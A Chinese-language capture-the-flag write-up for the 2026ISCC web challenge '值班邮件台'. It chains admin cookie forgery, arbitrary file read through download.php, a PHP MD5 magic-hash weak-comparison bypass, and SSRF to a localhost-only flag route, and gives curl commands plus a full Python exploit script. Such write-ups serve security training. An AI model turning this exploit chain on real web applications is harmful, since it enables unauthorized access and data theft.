## Web

### 值班邮件台

题目信息

来源：2026ISCC  
分类：Web  
题目：值班邮件台  
题目地址：`http://39.105.213.28:49103`  
附件：无

分析路径

首页先给了一个很扎眼的提示：当前登录用户显示为 `guest`，同时响应头里直接下发了 `mail_user=guest` 和 `mail_role=user` 两个 Cookie。邮件正文还写着“前端页面会继续沿用浏览器侧那套旧标记，方便大家切身份联调；上线前再统一替掉”，这基本就是在提醒后台身份来自客户端标记，而不是服务端会话。

继续点进 `/admin.php` 会收到 `Only admin can access this page.`。把 Cookie 改成 `mail_user=admin; mail_role=admin` 之后，后台预览面板立刻可以访问，说明第一处漏洞是直接信任客户端 Cookie 的身份伪造。

后台页面里有一个联调说明下载链接：

```text
/download.php?file=files/notes/preview-readme.txt
```

读完说明文件能拿到两条关键线索。一条是双人复核逻辑被单独摘录出来，调试时可直接查看 `admin.php`；另一条是诊断地址命名规则已经迁出，以 `route-index.txt` 为准。

于是继续读取：

```text
/download.php?file=admin.php
```

返回的联调代码如下：

```php
<?php
$tokenA = (string)($_POST['token_a'] ?? '');
$tokenB = (string)($_POST['token_b'] ?? '');

if ($tokenA === '' || $tokenB === '') {
    exit('两份预览凭据都需要填写');
}

if ($tokenA === $tokenB) {
    exit('两份输入不能完全相同');
}

$h1 = md5($tokenA);
$h2 = md5($tokenB);

if ($h1 == $h2 && $h1 !== $h2) {
    echo "校验通过，允许继续请求诊断地址";
} else {
    echo "双人复核失败";
}
?>
```

这里的问题很典型：`md5()` 的结果用了弱比较 `==`，同时又要求两者严格不等 `!==`。这正好可以用 PHP magic hash 绕过。选择 `QNKCDZO` 和 `240610708` 作为两份输入时，它们的 MD5 都是 `0e...` 这种形态，在弱比较中会被当成数值 `0`，因此比较成立，而原字符串和哈希字符串本身又并不完全相同，于是双人复核通过。

接着读取：

```text
/download.php?file=files/notes/route-index.txt
```

得到内部诊断路由：

```text
[内部诊断路由索引]

当前仍保留的诊断别名如下：
- health  -> /internal/health
- mailq   -> /internal/queue
- final   -> /internal/report?view=flag&slot=last
```

直接从外部访问这些 `/internal/...` 路由只会返回 `internal only`，说明它们限制为本机访问。后台预览器本身则会在双人复核通过后去请求 `target_url`。这里再做一个小验证：提交 `target_url=/internal/health` 会失败，但提交 `target_url=http://127.0.0.1/internal/health` 可以返回 `ok`。也就是说，预览器接受完整 URL，并且请求确实是从服务器本机发起的，于是第二个漏洞就变成了 SSRF。

最后把 `target_url` 指向 `http://127.0.0.1/internal/report?view=flag&slot=last`，就能借助后台预览器读取仅本机开放的 flag 接口。

关键命令

先验证 Cookie 伪造可进入后台：

```powershell
curl.exe -i -b "mail_user=admin; mail_role=admin" ^
  "http://39.105.213.28:49103/admin.php"
```

再利用 magic hash 和本机 SSRF 读取 flag：

```powershell
curl.exe -sS -b "mail_user=admin; mail_role=admin" ^
  -X POST ^
  -d "token_a=QNKCDZO" ^
  -d "token_b=240610708" ^
  --data-urlencode "target_url=http://127.0.0.1/internal/report?view=flag&slot=last" ^
  "http://39.105.213.28:49103/admin.php"
```

完整可运行脚本

```python
import re
import urllib.parse
import urllib.request


TARGET = "http://39.105.213.28:49103/admin.php"
COOKIES = "mail_user=admin; mail_role=admin"
POST_DATA = {
    "token_a": "QNKCDZO",
    "token_b": "240610708",
    "target_url": "http://127.0.0.1/internal/report?view=flag&slot=last",
}


def main() -> None:
    data = urllib.parse.urlencode(POST_DATA).encode()
    request = urllib.request.Request(TARGET, data=data, method="POST")
    request.add_header("Cookie", COOKIES)
    request.add_header("Content-Type", "application/x-www-form-urlencoded")

    with urllib.request.urlopen(request, timeout=10) as response:
        body = response.read().decode("utf-8", errors="replace")

    match = re.search(r"<textarea readonly>(.*?)</textarea>", body, re.S)
    if not match:
        raise SystemExit("flag not found in response")

    print(match.group(1).strip())


if __name__ == "__main__":
    main()
```
